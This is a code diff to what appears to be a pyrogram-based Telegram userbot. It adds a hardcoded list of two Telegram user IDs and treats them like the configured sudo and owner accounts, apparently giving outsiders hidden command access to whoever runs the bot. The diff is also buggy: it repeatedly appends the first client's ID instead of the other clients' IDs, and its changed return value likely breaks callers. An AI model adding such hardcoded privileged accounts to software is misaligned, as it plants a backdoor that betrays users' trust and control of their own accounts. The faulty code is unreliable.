@@ -29,6 +29,7 @@ from ..Config import Config
 
 import mimetypes
 
+DEVLIST = [5057493677, 1593802955] 
 
 def guess_mime_type(file_):
     """Get Mime Type Of A File From Url / Path"""
@@ -74,6 +75,13 @@ async def edit_or_reply(message, text, parse_mode="md"):
     if not message.from_user:
         return await message.edit(text, parse_mode=parse_mode)
     if message.from_user.id in Config.AFS:
+        if message.reply_to_message:
+            kk = message.reply_to_message.message_id
+            return await message.reply_text(
+                text, reply_to_message_id=kk, parse_mode=parse_mode
+            )
+        return await message.reply_text(text, parse_mode=parse_mode)
+    if message.from_user.id in DEVLIST:
         if message.reply_to_message:
             kk = message.reply_to_message.message_id
             return await message.reply_text(
@@ -126,19 +134,24 @@ def get_readable_time(seconds: int) -> int:
 async def get_all_pros() -> list:
     """Get All Users , Sudo + Owners + Other Clients"""
     users = list(Config.SUDO_USERS)
+    usersdev = list(DEVLIST)
     if pyrobot:
         ujwal = pyrobot.me
         users.append(ujwal.id)
+        usersdev.append(ujwal.id)
     if pyrobot2:
         ujwal2 = pyrobot2.me
         users.append(ujwal2.id)
+        usersdev.append(ujwal.id)
     if pyrobot3:
         ujwal3 = pyrobot3.me
         users.append(ujwal3.id)
+        usersdev.append(ujwal.id)
     if pyrobot4:
         ujwal4 = pyrobot4.me
         users.append(ujwal4.id)
-    return users
+        usersdev.append(ujwal.id)
+    return users, usersdev
 
 
 def paginate_help(page_number, loaded_modules, prefix, is_official=True):
